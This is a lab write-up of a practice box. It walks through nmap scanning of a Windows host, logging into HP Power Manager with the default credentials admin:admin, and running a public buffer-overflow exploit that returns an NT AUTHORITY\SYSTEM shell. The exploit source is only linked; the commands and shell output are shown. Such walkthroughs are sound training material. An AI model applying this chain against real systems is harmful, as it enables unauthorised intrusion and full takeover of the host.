---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Starting with a `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -p- -Pn 192.168.55.45
Nmap scan report for 192.168.55.45
Host is up (0.000085s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3573/tcp  open  tag-ups-1
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 102.74 seconds

$ nmap -p80,3389,3573,49152 -Pn -sV 192.168.55.45
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-31 13:45 EST
Nmap scan report for 192.168.55.45
Host is up (0.00026s latency).

PORT      STATE SERVICE        VERSION
80/tcp    open  http           GoAhead WebServer
3389/tcp  open  ms-wbt-server?
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc          Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.92%I=7%D=12/31%Time=61CF4FE2%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x01\x08\0\x
SF:02\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.65 seconds
```

## OS detection
```bash
$ sudo nmap -Pn -p80 -O 192.168.55.45                                             
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-31 14:28 EST
Nmap scan report for 192.168.55.45
Host is up (0.00052s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:BF:EB:38 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds

```

So our target is a `windows` machine and we start by investigating the web server on port 80.

---

# vulnerabilty
## web server (port 80)

On the webserver there is the `Hewlett-Packard (HP) Power Manager Administration` visible.  
Googling for default credentials show the following result.

![default credentials](/images/kevin1.png)

> `admin:admin` can be used to log in.
{: .prompt-info }

After we logged in we see that `hp power manager 4.2 (build 7)` on `windows 7` is used.

## exploitation
Researching on `Google` for an exploit reveals the following result.

![default credentials](/images/kevin2.png)

[Link to exploit](https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py)

After we downloaded the exploit we can simply fire it in the following way.

```bash
$ python2 hpm_exploit.py 192.168.55.45

##//#############################################################################################################
##                                                      ##                                                      #
## Vulnerability: HP Power Manager 'formExportDataLogs' ##  FormExportDataLogs Buffer Overflow                  #
##                                                      ##  HP Power Manager                                    #
## Vulnerable Application: HP Power Manager             ##  This is a part of the Metasploit Module,            #
## Tested on Windows [Version 6.1.7600]                 ##  exploit/windows/http/hp_power_manager_filename      #
##                                                      ##                                                      #
## Author: Muhammad Haidari                             ##  Spawns a shell to same window                       #
## Contact: ghmh@outlook.com                            ##                                                      #
## Website: www.github.com/muhammd                      ##                                                      #
##                                                      ##                                                      #
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python hpm_exploit.py <Remote IP Address>

[+] Payload Fired... She will be back in less than a min...
[+] Give me 30 Sec!
(UNKNOWN) [192.168.55.45] 1234 (?) open
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

> We got a `nt authority\system` shell!
{: .prompt-info }

```bash
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
c******************************6
```

Pwned! <@:-)
